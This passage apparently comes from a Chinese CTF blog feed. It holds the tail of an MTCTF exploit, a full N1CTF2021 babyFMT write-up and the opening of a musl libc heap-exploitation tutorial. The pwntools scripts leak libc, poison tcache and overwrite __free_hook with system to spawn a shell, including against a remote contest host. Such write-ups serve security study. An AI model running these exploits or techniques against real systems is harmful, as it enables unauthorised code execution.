choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  choose<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  drop<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>  addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token string">'\x7e'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> addr<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"#==>"</span><span class="token punctuation">,</span>addr    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">pass</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">"#==>"</span><span class="token punctuation">,</span>addr    addr <span class="token operator">=</span> addr<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">:</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>addr<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"##==>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">96</span>    <span class="token keyword">print</span> <span class="token string">"###==>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>    system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> <span class="token string">"####==>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>    cmd<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1804289383</span><span class="token punctuation">,</span><span class="token number">846930886</span><span class="token punctuation">,</span><span class="token number">1681692777</span><span class="token punctuation">,</span><span class="token number">1714636915</span><span class="token punctuation">,</span><span class="token number">1957747793</span><span class="token punctuation">,</span><span class="token number">424238335</span><span class="token punctuation">,</span><span class="token number">719885386</span><span class="token punctuation">,</span><span class="token number">1649760492</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      guess <span class="token operator">=</span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token builtin">int</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>      p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"guess>"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> MTCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF-babyFMT</title>
      <link href="//post/wp-N1ctf-babyfmt.html"/>
      <url>//post/wp-N1ctf-babyfmt.html</url>
      
        <content type="html"><![CDATA[<h1 id="WP-N1CTF2021-babyFMT"><a href="#WP-N1CTF2021-babyFMT" class="headerlink" title="[WP]N1CTF2021-babyFMT"></a>[WP]N1CTF2021-babyFMT</h1><p>NU1L战队举办的N1CTF-2021,由于当天同时有西湖论剑也就没咋看这场比赛,也就只看了看pwn1-babyFMT.</p><p>而且截至到现在这题的官方WP还没放出来,但当时调了好久也没逆明白,不过好巧不巧找到了super guesser战队的WP.</p><p>贴上WP地址:<a href="https://gist.github.com/hkraw/c889e5f0027ca898f75a3ca2b8ea4f5b">super guesser - babyFmt</a></p><span id="more"></span><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序重写了<code>scanf</code>和<code>printf</code></p><p>期中<code>scanf</code>存在参数 %d 和 %s 的参数与标准C的作用一样</p><p>但是<code>printf</code>只能使用参数 %r 和 %m ,作用类似于C中的 %d 和 %s</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>%r 会泄露heap上的垃圾数据进而可以用来泄露libc基地址</p><p>同时printf在使用’%’字符串之后,程序通过strlen()获得字符串长度,并填入缓冲区</p><p>缓冲区是在堆上申请的一块内存,主要申请思路为:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 并不是源码,只是一个程序的简要思路</span><span class="token keyword">char</span> <span class="token operator">*</span> str <span class="token operator">=</span> <span class="token string">"%aaa"</span><span class="token punctuation">;</span>size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//size=4</span>size <span class="token operator">+=</span> <span class="token number">0x10</span>      ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//malloc(0x14)</span><span class="token function">strcpy</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在IDA中表现为:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">str_len_size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>fmt_str<span class="token punctuation">)</span><span class="token punctuation">;</span>fmt_str_re <span class="token operator">=</span> <span class="token operator">*</span>fmt_str<span class="token punctuation">;</span>size <span class="token operator">=</span> str_len_size<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同时,当’%’后面不是’r’或者’m’的时候执行:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">default</span><span class="token operator">:</span>          v19 <span class="token operator">=</span> v43<span class="token punctuation">;</span>          v20 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> fmt_str_re_re<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            <span class="token keyword">do</span>            <span class="token punctuation">&#123;</span>              <span class="token operator">*</span>v19<span class="token operator">++</span> <span class="token operator">=</span> fmt <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>              fmt <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>              v21 <span class="token operator">=</span> v20<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> fmt <span class="token punctuation">)</span><span class="token punctuation">;</span>            v22 <span class="token operator">=</span> v21<span class="token punctuation">;</span>            v23 <span class="token operator">=</span> <span class="token operator">&amp;</span>v43<span class="token punctuation">[</span>v21<span class="token punctuation">]</span><span class="token punctuation">;</span>            v24 <span class="token operator">=</span> ptr_re<span class="token operator">-></span>m128i_i64 <span class="token operator">+</span> v22 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            v25 <span class="token operator">=</span> ptr_re<span class="token punctuation">;</span>            <span class="token keyword">do</span>            <span class="token punctuation">&#123;</span>              v26 <span class="token operator">=</span> <span class="token operator">*</span>v23<span class="token punctuation">;</span>              v25 <span class="token operator">=</span> <span class="token punctuation">(</span>v25 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token operator">--</span>v23<span class="token punctuation">;</span>              v25<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>psize<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> v26<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> v25 <span class="token operator">!=</span> v24 <span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_21<span class="token operator">:</span>            ptr_re <span class="token operator">=</span> <span class="token punctuation">(</span>ptr_re <span class="token operator">+</span> v20<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我们可以看到,由于申请chunk的大小(size)由strlen得到,但是会把我们输入的所有字符串填入chunk中</p><p>我们只要构造:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"%\x00aaaaaaaaaaaaaaaaaa"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主动填入一个<code>\x00</code>来使得strlen得到的size=1,这样就只会<code>malloc(0x11)</code>从而得到一个小chunk</p><p>但是我们可以填入很多字符,得到堆溢出.</p><p>这里还需要注意由于不能在填入<code>\x00</code>字符,所有我们应该选择修改size构造chunk overlap来修改tcache的fd,</p><p>之后修改free_hook为system函数,<code>show(idx,&quot;/bin/sh\x00&quot;)</code>来调用free_hook最终getshell</p><blockquote><p> chunk overlap的思路简单来就是修改size使当前chunk的size包含物理相邻的下一个被释放的chunk,之后在申请出来堆溢出写fd</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>给出我本地的exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name<span class="token operator">+</span><span class="token string">' : '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>auth<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">,</span><span class="token string">"Content size is "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Author:'</span><span class="token punctuation">,</span><span class="token string">"Book author is "</span><span class="token operator">+</span>auth<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content'</span><span class="token punctuation">,</span><span class="token string">"Book content is "</span><span class="token operator">+</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Idx:'</span><span class="token punctuation">,</span><span class="token string">"Book idx is "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>fmt<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Idx:'</span><span class="token punctuation">,</span><span class="token string">"Book idx is "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'yourself'</span><span class="token punctuation">,</span><span class="token string">'My format '</span><span class="token operator">+</span>fmt<span class="token operator">+</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''    fmt=='%r' ==>  show(author/bk)    fmt=='%%' ==>  '%'    fmt=='%x' (x!=r;x!=m) ==> 'x(ascii)''''</span>        local <span class="token operator">=</span> <span class="token number">1</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.31.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./babyFMT"</span><span class="token punctuation">,</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"43.155.72.106"</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token comment"># leak libc</span>add<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">,</span><span class="token string">"AAAA"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"BBBB"</span><span class="token punctuation">,</span><span class="token string">"BBBB"</span><span class="token punctuation">)</span> <span class="token comment">#1 </span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x4e0</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"%r"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">1168</span>success<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span><span class="token comment"># overflow</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"DDDD"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"DDDD"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x420</span><span class="token punctuation">,</span><span class="token string">"DDDD"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#3</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"DDDD"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#4</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"%\x00aaaaaaaaaaaaaaaa"</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xE1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"DDDD"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> N1CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MuslPwn浅析</title>
      <link href="//post/pwn-MuslPwn.html"/>
      <url>//post/pwn-MuslPwn.html</url>
      
        <content type="html"><![CDATA[<h1 id="musl-pwn-浅析"><a href="#musl-pwn-浅析" class="headerlink" title="musl pwn 浅析"></a>musl pwn 浅析</h1><p><a href="https://www.musl-libc.org/">musl libc</a> 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如Alpine Linux、OpenWrt和 Gentoo 等。</p><p>同时musl-1.1.x和musl-1.2.x的差距还比较大,结合几道题目简单分析下musl pwn的新姿势和调试技巧.</p><span id="more"></span><h2 id="调试配置"><a href="#调试配置" class="headerlink" title="调试配置"></a>调试配置</h2><p>上网找不到什么能看的资料, 太惨了,下面都是我自己各个地方找到然后凑整理在一起的.</p><p>首先的问题就是一般musl没法带符号调试, 题目给出的附件一般都是去符号表的.</p><h3 id="musl源码编译"><a href="#musl源码编译" class="headerlink" title="musl源码编译"></a>musl源码编译</h3><p>还好musl的libc.so的小版本不多,常用的也就是<strong>v1.1.24</strong>和<strong>v1.2.2</strong>.,基本可以自己本地编译一份对应版本的有符号表的musl的libc文件.</p><blockquote><p> 附上各个版本的musl下载连接:<br>**musl libc Release History : **<a href="https://musl.libc.org/releases.html">musl libc Release History</a></p></blockquote><p>具体的编译方法可以参考这位师傅的博客: <a href="http://www.wangqingzheng.com/anquanke/1/241101.html">学习musl</a>.</p><p>按照这位师傅的博客提供的编译方式编译完成之后,对应libc文件位于<code>musl_xxxx/build/lib/libc.so</code>.</p><p>编译完成之后就可以开始准备调试了</p><h3 id="GDB符号调试原理"><a href="#GDB符号调试原理" class="headerlink" title="GDB符号调试原理"></a>GDB符号调试原理</h3><p>源文件在编译时其实不携带源代码（以前以为 -g 命令就会带上源代码的QwQ）,而且源代码可能会移动，因此gdb需要一种方法寻找源代码文件的位置。gdb默认会有一个寻找源文件的列表叫做<code>source path</code>。<br>source path有两部分组成，<code>$cdir</code>和<code>$cwd</code>:</p><blockquote><p>$cdir:compile directory:如果加上了调试信息附加符号-g，$cdir会记录编译时文件夹绝对路径。如果没有加上-g就不会添加。这样也就可以理解为什么加上-g之后gdb可以找到文件源代码的原因了。<br>$cwd:current working directory当前工作目录。也就是当前gdb运行时目录.</p></blockquote><p><strong>一个例子:</strong></p><p>如果编译时使用了 -g 选项记录了源文件路径是<code>/home/mark/Desktop/gdbtest/code_dir/pwn.c</code></p><p>之后编译得到程序的目录是<code>/home/mark/Desktop/gdbtest/project_dir/pwn</code></p><p>即<code>mark@mark-Ubuntu20:~/Desktop/gdbtest/code_dir$  gcc -g pwn.c -o ../project_dir/pwn</code></p><p>在gdb中使用<code>info source</code>命令可以查看 源码信息,其中也包含编译信息:</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pwndbg&gt; show dirSource directories searched: &#x2F;?:$cdir:$cwdpwndbg&gt; pwd&#x2F;home&#x2F;mark&#x2F;Desktop&#x2F;gdbtest&#x2F;project_dirpwndbg&gt; info sourceCurrent source file is pwn.cCompilation directory is &#x2F;home&#x2F;mark&#x2F;Desktop&#x2F;gdbtest&#x2F;code_dirLocated in &#x2F;home&#x2F;mark&#x2F;Desktop&#x2F;gdbtest&#x2F;code_dir&#x2F;pwn.cContains 12 lines.Source language is c.Producer is GNU C17 9.3.0 -mtune&#x3D;generic -march&#x3D;x86-64 -g -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection.Compiled with DWARF 2 debugging format.Does not include preprocessor macro info.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>手动添加源码路径的方式就是<code>dir</code>命令</p><p>比如此时把pwn.c文件移动到/temp文件夹,只需要<code>dir /temp</code>,GDB就可以再次找到源码 </p><h3 id="musl源码级调试"><a href="#musl源码级调试" class="headerlink" title="musl源码级调试"></a>musl源码级调试</h3><p>可以看到，如果我们添加<code>dir /home</code>就相当于在source path下面直接添加了一个文件夹，之后由于编译的时候我们include了malloc.c文件，就可以源码调试malloc文件。但是！这样没有debug symbol。<br>用如下方式添加源代码路径，注意要添加的是源代码路径的上层文件夹。（例如malloc.c在文件夹/home/src/aaaa/malloc.c中，就写命令<code>dir /home/src/aaaa</code>.</p><p>这里我找了XCTF2020 高校战”疫”的一个musl题演示,我本地下载musl的源码并编译</p><p>在存放该题的路径下启动GDB调试:</p><p><code>dir /home/mark/Desktop/fucklibc/musl/musl-1.1.24/src/malloc</code></p><p>这个路径包括了malloc的源码malloc.c文件,之后gdb就可以在malloc的源码层面调试这个题</p><h3 id="debug-symbol调试"><a href="#debug-symbol调试" class="headerlink" title="debug symbol调试"></a>debug symbol调试</h3><p>题目一般给的附件都没有符号表信息,而一般给出的libc版本都是一些常见的大版本,我们只要本地编译一份,再使用GDB调试就可以带着符号表调试,更加有利于对一些陌生架构的调试.</p><p>以musl为例,musl源码和调试方法上文已经给出,接下说怎么使用自己的libc文件.</p><p>再exp中使用pwntools的本地连接的时候写成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/home/mark/Desktop/fucklibc/musl/musl-1.1.24/build/lib/libc.so"</span><span class="token punctuation">,</span><span class="token string">"./carbon"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后再在exp中运行到<code>gdb.attach(p)</code>的时候,调试该程序就是带符号表的调试.</p><p>查看效果:</p><p><img src="https://pic.imgdb.cn/item/619b96982ab3f51d91a44c83.png"></p><p>震惊一整年系列 !!!</p><h2 id="musl-1-1-24"><a href="#musl-1-1-24" class="headerlink" title="musl-1.1.24"></a>musl-1.1.24</h2><p>musl-1.1.24是musl-1.1.x系列比较经典的版本,这里作为musl-1.1.x的代表简单分析下几个相关的数据结构</p><p><strong>v1.1.24</strong>源码 : <a href="https://git.musl-libc.org/cgit/musl/commit/?h=v1.1.24&id=ea9525c8bcf6170df59364c4bcd616de1acf8703">musl-1.1.24</a></p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>1.1.24代表了比较老版本的Musl libc，该版本的内存管理有以下几个相关的结构体:</p><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> psize<span class="token punctuation">,</span> csize<span class="token punctuation">;</span>   <span class="token comment">// 与 glibc 的 prev size 和 size类似</span>    <span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>     <span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>chunk</code>的结构大致与glibc类似，chunk之间不会复用任何区域。<code>psize</code>和<code>csize</code>的最后的1bit为<code>inuse</code>控制位。若设置<code>inuse</code>标志位为1，表示 chunk 正在被使用；若没有设置<code>inuse</code>标志位，表示 chunk 已经被释放或者通过<code>mmap</code>分配的，需要通过<code>psize</code>的标志位来进一步判断 chunk 